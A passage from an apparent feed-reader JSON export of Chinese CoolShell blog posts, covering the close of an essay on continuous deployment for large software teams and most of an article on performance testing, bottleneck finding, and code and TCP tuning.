包C到机器MC，……（Web Service的SOA架构），这些包之间有运行依赖性和兼容性问题，要么一次性全部完成，要么就全部失败。回滚也是一样的，这是一个部署事务或部署一致性的问题。如何解决呢？</li>\n</ul>\n<ul>\n<li><strong>部署环境的版本控制问题</strong>。前面说过，我们的一个环境就会和若干个包的版本耦合，环境必需管理要部署的包的版本。于是，当你的部署越来越多的时候，各个环境的包的版本开始出现混乱，各种依赖间的版本也会出现不统一的情况，也就是说，就算你有这样的一个工具，在一个高速开发的环境下，我们的部署环境的管理还是会出现很多混乱的情况，需要你不断地统一大家的开发、测试环境。</li>\n</ul>\n<ul>\n<li><strong>部署计划</strong>。我们可能会有很多部署计划，比如：设定定时部署，提升或降低部署优先级，部署事务定义，部署策略（如：先部署10%的机器，如果没有问题，再把剩下的系统部署了），热切计划和策略…… 等等 ，等等 。</li>\n</ul>\n<ul>\n<li><strong>部署的监控和维护</strong>。任何软件和系统都会有这样的问题，当规模上去了以后，我们的自动化部署系统的监控和维护的复杂度并不亚于一个大型的互联网应用。</li>\n</ul>\n<div>这样的问题会有很多，基本上来说，<strong>这样一个持续集成持续部署的自动化系统并不是那么简单的事，其开发工作量和一个标准的大型互联网业务系统没什么两样</strong>。</div>\n<h4>六、总结</h4>\n<p>这里只谈一点自己的看法，从传统的持续集成到面向大型软件的持续部署，我们将系统所依赖的软件环境和软件包抽象为一致的实体纳入到管理之中，并将运维人员的工作真正的分摊到开发人员身上。而云计算的出现，使得计算机本身也可以自动化的创建和回收，这样环境管理的范畴将进一步扩充。相应的，部署的能力和灵活性也是一次质的飞跃，将再一次减轻运维人员的工作压力。</p>\n<p>说了这么多废话，总结一下自己的观点，对于向大型软件企业推销基于持续集成的持续部署（交付）的哥们：</p>\n<ul>\n<li><strong>你就是在耍流氓</strong>，如果你不解决环境管理！！！</li>\n<li><strong>你就是在耍流氓</strong>，如果你不建立部署系统！！！</li>\n<li><strong>你就是在耍流氓</strong>，如果你不扩展编译系统！！！</li>\n<li><strong>你就是在耍流氓</strong>，如果你只是推销小团队的实践而不考虑改造大环境！！！</li>\n<li><strong>你就是个流氓</strong>，如果你只是不断地告诉别人怎么做，自己却从来不动手写一个测试或建立一个持续集成环境！！！</li>\n</ul>\n<p>最后，用Linus最经典的话来结束本文——“ Talk is Cheap, Show me the Code！”</p>\n<p>（<strong>注：本文由<a href=\"http://weibo.com/renfake\">@常新居士</a>完成初稿，我做了一些编辑，主要写了第五节“没完”</strong> ）<br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"预发布环境,Tag发布机制和可重复的部署过程\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3709.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7657.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">预发布环境,Tag发布机制和可重复的部署过程</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Kent Beck 谈单元测试和持续部署\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F2681.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7657.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Kent Beck 谈单元测试和持续部署</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"结对编程的利与弊\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F16.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7657.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/02/12/2675017.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">结对编程的利与弊</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"为什么敏捷方法能在软件开发中行之有效？\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F2622.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7657.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2012/08/10/40286139.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">为什么敏捷方法能在软件开发中行之有效？</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"[转]TDD到底美还是不美？\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3766.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7657.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/06/21/13668829.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">[转]TDD到底美还是不美？</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2011年10月17日 -- <a href=\"http://coolshell.cn/articles/5531.html\" title=\"Test-Driven Development？别逗了\">Test-Driven Development？别逗了</a></li><li>2011年10月16日 -- <a href=\"http://coolshell.cn/articles/5625.html\" title=\"“品质在于构建过程”吗？\">“品质在于构建过程”吗？</a></li><li>2011年08月12日 -- <a href=\"http://coolshell.cn/articles/5143.html\" title=\"在新浪微博上关于敏捷的一些讨论\">在新浪微博上关于敏捷的一些讨论</a></li><li>2011年07月21日 -- <a href=\"http://coolshell.cn/articles/5044.html\" title=\" 为什么Scrum不行？\"> 为什么Scrum不行？</a></li><li>2011年06月27日 -- <a href=\"http://coolshell.cn/articles/4891.html\" title=\"Bob大叔和Jim Coplien对TDD的论战\">Bob大叔和Jim Coplien对TDD的论战</a></li><li>2011年02月25日 -- <a href=\"http://coolshell.cn/articles/3778.html\" title=\"敏捷水管工\">敏捷水管工</a></li><li>2011年02月24日 -- <a href=\"http://coolshell.cn/articles/3745.html\" title=\"再谈敏捷和ThoughtWorks中国咨询师\">再谈敏捷和ThoughtWorks中国咨询师</a></li></ul></p>"
    },
    "author" : "马基雅弗利",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1340460469077",
    "timestampUsec" : "1340460469077019",
    "id" : "tag:google.com,2005:reader/item/e8f2f130b63473a3",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Unix/Linux", "Windows", "操作系统", "数据库", "程序设计", "系统架构", "Linux", "MySQL", "Performance", "SQL", "TCP", "UDP" ],
    "title" : "性能调优攻略",
    "published" : 1340155493,
    "updated" : 1340155493,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7490.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><img title=\"Performance Tuning\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/f1-300x216.jpg\" alt=\"\" width=\"300\" height=\"216\">关于性能优化这是一个比较大的话题，在《<a title=\"由12306.cn谈谈网站性能技术\" href=\"http://coolshell.cn/articles/6470.html\">由12306.cn谈谈网站性能技术</a>》中我从业务和设计上说过一些可用的技术以及那些技术的优缺点，今天，想从一些技术细节上谈谈性能优化，主要是一些代码级别的技术和方法。<strong>本文的东西是我的一些经验和知识，并不一定全对，希望大家指正和补充</strong>。</p>\n<p>在开始这篇文章之前，大家可以移步去看一下酷壳以前发表的《<a title=\"代码优化概要\" href=\"http://coolshell.cn/articles/2967.html\">代码优化概要</a>》，这篇文章基本上告诉你——<strong>要进行优化，先得找到性能瓶颈</strong>！ 但是在讲如何定位系统性能瓶劲之前，请让我讲一下系统性能的定义和测试，因为没有这两件事，后面的定位和优化无从谈起。</p>\n<h4>一、系统性能定义</h4>\n<p>让我们先来说说如何什么是系统性能。这个定义非常关键，如果我们不清楚什么是系统性能，那么我们将无法定位之。我见过很多朋友会觉得这很容易，但是仔细一问，其实他们并没有一个比较系统的方法，所以，在这里我想告诉大家如何系统地来定位性能。 总体来说，系统性能就是两个事：</p>\n<ol>\n<li><strong>Throughput</strong> ，吞吐量。也就是每秒钟可以处理的请求数，任务数。</li>\n<li><strong>Latency</strong>， 系统延迟。也就是系统在处理一个请求或一个任务时的延迟。</li>\n</ol>\n<p>一般来说，一个系统的性能受到这两个条件的约束，缺一不可。比如，我的系统可以顶得住一百万的并发，但是系统的延迟是2分钟以上，那么，这个一百万的负载毫无意义。系统延迟很短，但是吞吐量很低，同样没有意义。所以，一个好的系统的性能测试必然受到这两个条件的同时作用。 有经验的朋友一定知道，这两个东西的一些关系：</p>\n<ul>\n<li><strong>Throughput越大，Latency会越差。</strong>因为请求量过大，系统太繁忙，所以响应速度自然会低。</li>\n<li><strong>Latency越好，能支持的Throughput就会越高。</strong>因为Latency短说明处理速度快，于是就可以处理更多的请求。</li>\n</ul>\n<h4>二、系统性能测试</h4>\n<p>经过上述的说明，我们知道要测试系统的性能，需要我们收集系统的Throughput和Latency这两个值。</p>\n<p><span></span></p>\n<ul>\n<li>首先，<strong>需要定义Latency这个值</strong>，比如说，对于网站系统响应时间必需是5秒以内（对于某些实时系统可能需要定义的更短，比如5ms以内，这个更根据不同的业务来定义）</li>\n</ul>\n<ul>\n<li>其次，<strong>开发性能测试工具</strong>，一个工具用来制造高强度的Throughput，另一个工具用来测量Latency。对于第一个工具，你可以参考一下“<a title=\"十个免费的Web压力测试工具\" href=\"http://coolshell.cn/articles/2589.html\">十个免费的Web压力测试工具</a>”，关于如何测量Latency，你可以在代码中测量，但是这样会影响程序的执行，而且只能测试到程序内部的Latency，真正的Latency是整个系统都算上，包括操作系统和网络的延时，你可以使用Wireshark来抓网络包来测量。这两个工具具体怎么做，这个还请大家自己思考去了。</li>\n</ul>\n<ul>\n<li>最后，<strong>开始性能测试</strong>。你需要不断地提升测试的Throughput，然后观察系统的负载情况，如果系统顶得住，那就观察Latency的值。这样，你就可以找到系统的最大负载，并且你可以知道系统的响应延时是多少。</li>\n</ul>\n<p>再多说一些，</p>\n<ul>\n<li>关于Latency，如果吞吐量很少，这个值估计会非常稳定，当吞吐量越来越大时，系统的Latency会出现非常剧烈的抖动，所以，我们在测量Latency的时候，我们需要注意到Latency的分布，也就是说，有百分之几的在我们允许的范围，有百分之几的超出了，有百分之几的完全不可接受。也许，平均下来的Latency达标了，但是其中仅有50%的达到了我们可接受的范围。那也没有意义。</li>\n</ul>\n<ul>\n<li>关于性能测试，我们还需要定义一个时间段。比如：在某个吞吐量上持续15分钟。因为当负载到达的时候，系统会变得不稳定，当过了一两分钟后，系统才会稳定。另外，也有可能是，你的系统在这个负载下前几分钟还表现正常，然后就不稳定了，甚至垮了。所以，需要这么一段时间。这个值，我们叫做峰值极限。</li>\n</ul>\n<ul>\n<li>性能测试还需要做Soak Test，也就是在某个吞吐量下，系统可以持续跑一周甚至更长。这个值，我们叫做系统的正常运行的负载极限。</li>\n</ul>\n<p>性能测试有很多很复要的东西，比如：burst test等。 这里不能一一详述，这里只说了一些和性能调优相关的东西。总之，性能测试是一细活和累活。</p>\n<h4>三、定位性能瓶颈</h4>\n<p><img title=\"bottleneck\" src=\"http://coolshell.cn/wp-content/uploads/2012/06/bottleneck.jpg\" alt=\"\" width=\"200\" height=\"200\">有了上面的铺垫，我们就可以测试到到系统的性能了，再调优之前，我们先来说说如何找到性能的瓶颈。我见过很多朋友会觉得这很容易，但是仔细一问，其实他们并没有一个比较系统的方法。</p>\n<h5>3.1）查看操作系统负载</h5>\n<p>首先，当我们系统有问题的时候，我们不要急于去调查我们代码，这个毫无意义。我们首要需要看的是操作系统的报告。看看操作系统的CPU利用率，看看内存使用率，看看操作系统的IO，还有网络的IO，网络链接数，等等。Windows下的perfmon是一个很不错的工具，Linux下也有很多相关的命令和工具，比如：<a href=\"http://sourceware.org/systemtap/\">SystemTap</a>，<a href=\"https://latencytop.org/\">LatencyTOP</a>，vmstat, sar, iostat, top, tcpdump等等 。通过观察这些数据，我们就可以知道我们的软件的性能基本上出在哪里。比如：</p>\n<p>1）先看CPU利用率，如果CPU利用率不高，但是系统的Throughput和Latency上不去了，这说明我们的程序并没有忙于计算，而是忙于别的一些事，比如IO。（另外，CPU的利用率还要看内核态的和用户态的，内核态的一上去了，整个系统的性能就下来了。而对于多核CPU来说，CPU 0 是相当关键的，如果CPU 0的负载高，那么会影响其它核的性能，因为CPU各核间是需要有调度的，这靠CPU0完成）</p>\n<p>2）然后，我们可以看一下IO大不大，IO和CPU一般是反着来的，CPU利用率高则IO不大，IO大则CPU就小。关于IO，我们要看三个事，一个是磁盘文件IO，一个是驱动程序的IO（如：网卡），一个是内存换页率。这三个事都会影响系统性能。</p>\n<p>3）然后，查看一下网络带宽使用情况，在Linux下，你可以使用iftop, iptraf, ntop, tcpdump这些命令来查看。或是用Wireshark来查看。</p>\n<p>4）如果CPU不高，IO不高，内存使用不高，网络带宽使用不高。但是系统的性能上不去。这说明你的程序有问题，比如，你的程序被阻塞了。可能是因为等那个锁，可能是因为等某个资源，或者是在切换上下文。</p>\n<p><strong>通过了解操作系统的性能，我们才知道性能的问题，比如：带宽不够，内存不够，TCP缓冲区不够，等等，很多时候，不需要调整程序的，只需要调整一下硬件或操作系统的配置就可以了</strong>。</p>\n<h5>3.2）使用Profiler测试</h5>\n<p>接下来，我们需要使用性能检测工具，也就是使用某个Profiler来差看一下我们程序的运行性能。如：Java的JProfiler/TPTP/CodePro Profiler，GNU的gprof，IBM的PurifyPlus，Intel的VTune，AMD的CodeAnalyst，还有Linux下的OProfile/perf，后面两个可以让你对你的代码优化到CPU的微指令级别，如果你关心CPU的L1/L2的缓存调优，那么你需要考虑一下使用VTune。 使用这些Profiler工具，可以让你程序中各个模块函数甚至指令的很多东西，如：<strong>运行的时间</strong> ，<strong>调用的次数</strong>，<strong>CPU的利用率</strong>，等等。这些东西对我们来说非常有用。</p>\n<p>我们重点观察运行时间最多，调用次数最多的那些函数和指令。这里注意一下，对于调用次数多但是时间很短的函数，你可能只需要轻微优化一下，你的性能就上去了（比如：某函数一秒种被调用100万次，你想想如果你让这个函数提高0.01毫秒的时间 ，这会给你带来多大的性能）</p>\n<p>使用Profiler有个问题我们需要注意一下，因为Profiler会让你的程序运行的性能变低，像PurifyPlus这样的工具会在你的代码中插入很多代码，会导致你的程序运行效率变低，从而没发测试出在高吞吐量下的系统的性能，对此，一般有两个方法来定位系统瓶颈：</p>\n<p>1）在你的代码中自己做统计，使用微秒级的计时器和函数调用计算器，每隔10秒把统计log到文件中。</p>\n<p>2）分段注释你的代码块，让一些函数空转，做Hard Code的Mock，然后再测试一下系统的Throughput和Latency是否有质的变化，如果有，那么被注释的函数就是性能瓶颈，再在这个函数体内注释代码，直到找到最耗性能的语句。</p>\n<p>最后再说一点，<strong>对于性能测试，不同的Throughput会出现不同的测试结果，不同的测试数据也会有不同的测试结果。所以，用于性能测试的数据非常重要，性能测试中，我们需要观测试不同Throughput的结果</strong>。</p>\n<h4>四、常见的系统瓶颈</h4>\n<p>下面这些东西是我所经历过的一些问题，也许并不全，也许并不对，大家可以补充指正，我<strong>纯属抛砖引玉</strong>。关于系统架构方面的性能调优，大家可移步看一下《<a title=\"由12306.cn谈谈网站性能技术\" href=\"http://coolshell.cn/articles/6470.html\">由12306.cn谈谈网站性能技术</a>》，关于Web方面的一些性能调优的东西，大家可以看看《<a title=\"Web开发中需要了解的东西\" href=\"http://coolshell.cn/articles/6043.html\">Web开发中需要了解的东西</a>》一文中的性能一章。我在这里就不再说设计和架构上的东西了。</p>\n<p><strong></strong>一般来说，性能优化也就是下面的几个策略：</p>\n<ul>\n<li><strong>用空间换时间</strong>。各种cache如CPU L1/L2/RAM到硬盘，都是用空间来换时间的策略。这样策略基本上是把计算的过程一步一步的保存或缓存下来，这样就不用每次用的时候都要再计算一遍，比如数据缓冲，CDN，等。这样的策略还表现为冗余数据，比如数据镜象，负载均衡什么的。</li>\n</ul>\n<ul>\n<li><strong>用时间换空间</strong>。有时候，少量的空间可能性能会更好，比如网络传输，如果有一些压缩数据的算法（如前些天说的“<a title=\"Huffman 编码压缩算法\" href=\"http://coolshell.cn/articles/7459.html\">Huffman 编码压缩算法</a>” 和 “<a title=\"rsync 的核心算法\" href=\"http://coolshell.cn/articles/7425.html\">rsync 的核心算法</a>”），这样的算法其实很耗时，但是因为瓶颈在网络传输，所以用时间来换空间反而能省时间。</li>\n</ul>\n<ul>\n<li><strong>简化代码</strong>。最高效的程序就是不执行任何代码的程序，所以，代码越少性能就越高。关于代码级优化的技术大学里的教科书有很多示例了。如：减少循环的层数，减少递归，在循环中少声明变量，少做分配和释放内存的操作，尽量把循环体内的表达式抽到循环外，条件表达的中的多个条件判断的次序，尽量在程序启动时把一些东西准备好，注意函数调用的开销（栈上开销），注意面向对象语言中临时对象的开销，小心使用异常（不要用异常来检查一些可接受可忽略并经常发生的错误），…… 等等，等等，这连东西需要我们非常了解编程语言和常用的库。</li>\n</ul>\n<ul>\n<li><strong>并行处理</strong>。如果CPU只有一个核，你要玩多进程，多线程，对于计算密集型的软件会反而更慢（因为操作系统调度和切换开销很大），CPU的核多了才能真正体现出多进程多线程的优势。并行处理需要我们的程序有Scalability，不能水平或垂直扩展的程序无法进行并行处理。从架构上来说，这表再为——是否可以做到不改代码只是加加机器就可以完成性能提升？</li>\n</ul>\n<p>总之，<strong>根据2：8原则来说，20%的代码耗了你80%的性能，找到那20%的代码，你就可以优化那80%的性能</strong>。 下面的一些东西都是我的一些经验，我只例举了一些最有价值的性能调优的的方法，供你参考，也欢迎补充。</p>\n<p><strong>4.1）算法调优</strong>。算法非常重要，好的算法会有更好的性能。举几个我经历过的项目的例子，大家可以感觉一下。</p>\n<ul>\n<li>一个是<strong>过滤算法</strong>，系统需要对收到的请求做过滤，我们把可以被filter in/out的东西配置在了一个文件中，原有的过滤算法是遍历过滤配置，后来，我们找到了一种方法可以对这个过滤配置进行排序，这样就可以用二分折半的方法来过滤，系统性能增加了50%。</li>\n</ul>\n<ul>\n<li>一个是<strong>哈希算法</strong>。计算哈希算法的函数并不高效，一方面是计算太费时，另一方面是碰撞太高，碰撞高了就跟单向链表一个性能（可参看<a title=\"Hash Collision DoS 问题\" href=\"http://coolshell.cn/articles/6424.html\">Hash Collision DoS 问题</a>）。我们知道，算法都是和需要处理的数据很有关系的，就算是被大家所嘲笑的“冒泡排序”在某些情况下（大多数数据是排好序的）其效率会高于所有的排序算法。哈希算法也一样，广为人知的哈希算法都是用英文字典做测试，但是我们的业务在数据有其特殊性，所以，对于还需要根据自己的数据来挑选适合的哈希算法。对于我以前的一个项目，公司内某牛人给我发来了一个哈希算法，结果让我们的系统性能上升了150%。（关于各种哈希算法，你一定要看看<a href=\"http://programmers.stackexchange.com/questions/49550/which-hashing-algorithm-is-best-for-uniqueness-and-speed/145633#145633\">StackExchange上的这篇关于各种hash算法的文章</a> ）</li>\n</ul>\n<ul>\n<li><strong>分而治之和预处理</strong>。以前有一个程序为了生成月报表，每次都需要计算很长的时间，有时候需要花将近一整天的时间。于是我们把我们找到了一种方法可以把这个算法发成增量式的，也就是说我每天都把当天的数据计算好了后和前一天的报表合并，这样可以大大的节省计算时间，每天的数据计算量只需要20分钟，但是如果我要算整个月的，系统则需要10个小时以上（SQL语句在大数据量面前性能成级数性下降）。这种分而治之的思路在大数据面前对性能有很帮助，就像merge排序一样。SQL语句和数据库的性能优化也是这一策略，如：使用嵌套式的Select而不是笛卡尔积的Select，使用视图，等等。</li>\n</ul>\n<p><strong>4.2）代码调优</strong>。从我的经验上来说，代码上的调优有下面这几点：</p>\n<ul>\n<li><strong>字符串操作</strong>。这是最费系统性能的事了，无论是strcpy, strcat还是strlen，最需要注意的是字符串子串匹配。所以，能用整型最好用整型。举几个例子，第一个例子是N年前做银行的时候，我的同事喜欢把日期存成字符串（如：2012-05-29 08:30:02），我勒个去，一个select  where between语句相当耗时。另一个例子是，我以前有个同事把一些状态码用字符串来处理，他的理由是，这样可以在界面上直接显示，后来性能调优的时候，我把这些状态码全改成整型，然后用位操作查状态，因为有一个每秒钟被调用了150K次的函数里面有三处需要检查状态，经过改善以后，整个系统的性能上升了30%左右。还有一个例子是，我以前从事的某个产品编程规范中有一条是要在每个函数中把函数名定义出来，如：const char fname[]=”functionName()”, 这是为了好打日志，但是为什么不声明成 static类型的呢？</li>\n</ul>\n<ul>\n<li><strong>多线程调优</strong>。有人说，thread is evil，这个对于系统性能在某些时候是个问题。因为多线程瓶颈就在于互斥和同步的锁上，以及线程上下文切换的成本，怎么样的少用锁或不用锁是根本（比如：<a title=\"多版本并发控制(MVCC)在分布式系统中的应用\" href=\"http://coolshell.cn/articles/6790.html\">多版本并发控制(MVCC)在分布式系统中的应用</a> 中说的乐观锁可以解决性能问题），此外，还有读写锁也可以解决大多数是读操作的并发的性能问题。这里多说一点在C++中，我们可能会使用线程安全的智能指针AutoPtr或是别的一些容器，只要是线程安全的，其不管三七二十一都要上锁，上锁是个成本很高的操作，使用AutoPtr会让我们的系统性能下降得很快，如果你可以保证不会有线程并发问题，那么你应该不要用AutoPtr。我记得我上次我们同事去掉智能指针的引用计数，让系统性能提升了50%以上。对于Java对象的引用计数，如果我猜的没错的话，到处都是锁，所以，Java的性能问题一直是个问题。另外，线程不是越多越好，线程间的调度和上下文切换也是很夸张的事，尽可能的在一个线程里干，尽可能的不要同步线程。这会让你有很多的性能。</li>\n</ul>\n<ul>\n<li><strong>内存分配</strong>。不要小看程序的内存分配。malloc/realloc/calloc这样的系统调非常耗时，尤其是当内存出现碎片的时候。我以前的公司出过这样一个问题——在用户的站点上，我们的程序有一天不响应了，用GDB跟进去一看，系统hang在了malloc操作上，20秒都没有返回，重启一些系统就好了。这就是内存碎片的问题。这就是为什么很多人抱怨STL有严重的内存碎片的问题，因为太多的小内存的分配释放了。有很多人会以为用内存池可以解决这个问题，但是实际上他们只是重新发明了Runtime-C或操作系统的内存管理机制，完全于事无补。当然解决内存碎片的问题还是通过内存池，具体来说是一系列不同尺寸的内存池（这个留给大家自己去思考）。当然，少进行动态内存分配是最好的。说到内存池就需要说一下池化技术。比如线程池，连接池等。池化技术对于一些短作业来说（如http服务） 相当相当的有效。这项技术可以减少链接建立，线程创建的开销，从而提高性能。</li>\n</ul>\n<ul>\n<li><strong>异步操作</strong>。我们知道Unix下的文件操作是有block和non-block的方式的，像有些系统调用也是block式的，如：Socket下的select，Windows下的WaitforObject之类的，如果我们的程序是同步操作，那么会非常影响性能，我们可以改成异步的，但是改成异步的方式会让你的程序变复杂。异步方式一般要通过队列，要注间队列的性能问题，另外，异步下的状态通知通常是个问题，比如消息事件通知方式，有callback方式，等，这些方式同样可能会影响你的性能。但是通常来说，异步操作会让性能的吞吐率有很大提升（Throughput），但是会牺牲系统的响应时间（latency）。这需要业务上支持。</li>\n</ul>\n<ul>\n<li><strong>语言和代码库</strong>。我们要熟悉语言以及所使用的函数库或类库的性能。比如：STL中的很多容器分配了内存后，那怕你删除元素，内存也不会回收，其会造成内存泄露的假像，并可能造成内存碎片问题。再如，STL某些容器的size()==0  和 empty()是不一样的，因为，size()是O(n)复杂度，empty()是O(1)的复杂度，这个要小心。Java中的JVM调优需要使用的这些参数：-Xms -Xmx -Xmn -XX:SurvivorRatio -XX:MaxTenuringThreshold，还需要注意JVM的GC，GC的霸气大家都知道，尤其是full GC（还整理内存碎片），他就像“恐龙特级克赛号”一样，他运行的时候，整个世界的时间都停止了。</li>\n</ul>\n<p><strong>4.3）网络调优</strong></p>\n<p>关于网络调优，尤其是TCP Tuning（你可以以这两个关键词在网上找到很多文章），这里面有很多很多东西可以说。看看Linux下TCP/IP的那么多参数就知道了（顺便说一下，你也许不喜欢Linux，但是你不能否认Linux给我们了很多可以进行内核调优的权力）。强烈建议大家看看《<a href=\"http://book.douban.com/subject/1088054/\">TCP/IP 详解 卷1:协议</a>》这本书。我在这里只讲一些概念上的东西。</p>\n<p><strong>A） TCP调优</strong></p>\n<p>我们知道TCP链接是有很多开销的，一个是会占用文件描述符，另一个是会开缓存，一般来说一个系统可以支持的TCP链接数是有限的，我们需要清楚地认识到TCP链接对系统的开销是很大的。正是因为TCP是耗资源的，所以，很多攻击都是让你系统上出现大量的TCP链接，把你的系统资源耗尽。比如著名的SYNC Flood攻击。</p>\n<p>所以，我们要注意配置KeepAlive参数，这个参数的意思是定义一个时间，如果链接上没有数据传输，系统会在这个时间发一个包，如果没有收到回应，那么TCP就认为链接断了，然后就会把链接关闭，这样可以回收系统资源开销。（注：HTTP层上也有KeepAlive参数）对于像HTTP这样的短链接，设置一个1-2分钟的keepalive非常重要。这可以在一定程度上防止DoS攻击。有下面几个参数（下面这些参数的值仅供参考）：</p>\n<pre>net.ipv4.tcp_keepalive_probes = 5\nnet.ipv4.tcp_keepalive_intvl = 20\nnet.ipv4.tcp_fin_timeout = 30</pre>\n<p>对于TCP的TIME_WAIT这个状态，主动关闭的一方进入TIME_WAIT状态，TIME_WAIT状态将持续2个MSL(Max Segment Lifetime)，默认为4分钟，TIME_WAIT状态下的资源不能回收。有大量的TIME_WAIT链接的情况一般是在HTTP服务器上。对此，有两个参数需要注意，</p>\n<pre>net.ipv4.tcp_tw_reuse=1\nnet.ipv4.tcp_tw_recycle=1</pre>\n<p>前者表示重用TIME_WAIT，后者表示回收TIME_WAIT的资源。</p>\n<p>TCP还有一个重要的概念叫RWIN（TCP Receive Window Size），这个东西的意思是，我一个TCP链接在没有向Sender发出ack时可以接收到的最大的数据包。为什么这个很重要？因为如果Sender没有收到Receiver发过来ack，Sender就会停止发送数据并会等一段时间，如果超时，那么就会重传。这就是为什么TCP链接是可靠链接的原因。重传还不是最严重的，如果有丢包发生的话，TCP的带宽使用率会马上受到影响（会盲目减半），再丢包，再减半，然后如果不丢包了，就逐步恢复。相关参数如下：</p>\n<pre>net.core.wmem_default = 8388608\nnet.core.rmem_default = 8388608\nnet.core.rmem_max = 16777216\nnet.core.wmem_max = 16777216</pre>\n<p>一般来说，理论上的RWIN应该设置成：吞吐量  * 回路时间。Sender端的buffer应该和RWIN有一样的大小，因为Sender端发送完数据后要等Receiver端确认，如果网络延时很大，buffer过小了，确认的次数就会多，于是性能就不高，对网络的利用率也就不高了。也就是说，对于延迟大的网络，我们需要大的buffer，这样可以少一点ack，多一些数据，对于响应快一点的网络，可以少一些buffer。因为，如果有丢包（没有收到ack），buffer过大可能会有问题，因为这会让TCP重传所有的数据，反而影响网络性能。（当然，网络差的情况下，就别玩什么高性能了） 